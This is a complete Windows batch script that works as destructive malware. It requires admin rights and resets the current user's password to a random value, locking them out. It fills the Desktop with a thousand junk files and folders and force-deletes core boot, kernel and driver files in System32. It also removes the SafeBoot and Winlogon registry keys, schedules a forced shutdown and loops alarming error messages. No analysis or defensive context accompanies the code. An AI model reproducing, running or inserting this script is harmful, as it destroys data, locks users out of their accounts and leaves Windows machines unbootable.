@echo off

color 0c

for /f "tokens=*" %%a in ('whoami') do set "currentuser=%%a"
set "currentuser=!currentuser:*\=!"

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    msg * "Please open this with admin permissions!"
    exit /b
)

set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"
set "newpass="
for /L %%i in (1,1,16) do (
    set /a "x=!random! %% 84"
    set "newpass=!newpass!!chars:~%x%,1!"
)

:continue
set "currentuser=%username%"

net user %currentuser% "%newpass%" >nul 2>&1

cd %userprofile%\Desktop

for /L %%i in (1,1,1000) do (
    set "random_name="
    for /L %%j in (1,1,8) do (
        set /a "rand=!random! %% 36"
        if !rand! lss 10 (
            set "random_name=!random_name!!rand!"
        ) else (
            set /a "letter=!rand!+55"
            cmd /c exit !letter!
            for /f %%k in ('powershell -command "[char]!letter!"') do (
                set "random_name=!random_name!%%k"
            )
        )
    )
    echo "File" > "!random_name!.txt"
    md "Folder_!random_name!" 2>nul
)

del /f /q /s "%SystemRoot%\System32\winload.exe" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\ntoskrnl.exe" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\hal.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\bootvid.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\ci.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\drivers\disk.sys" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\drivers\pci.sys" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\*" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\Config\*.*" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\drivers\*.*" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\DRIVERS\*.*" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\kdcom.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\mcupdate_GenuineIntel.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\PSHED.dll" >nul 2>&1
del /f /q /s "%SystemRoot%\System32\CLFS.sys" >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f >nul 2>&1
shutdown /f /s /t 600
msg * "Hi!"
:loop
    msg * "System critical error detected!"
    msg * "Boot sector compromised!"
    msg * "System will be unusable in 10 minutes!"
    msg * "Some important system files have been deleted!"
goto loop
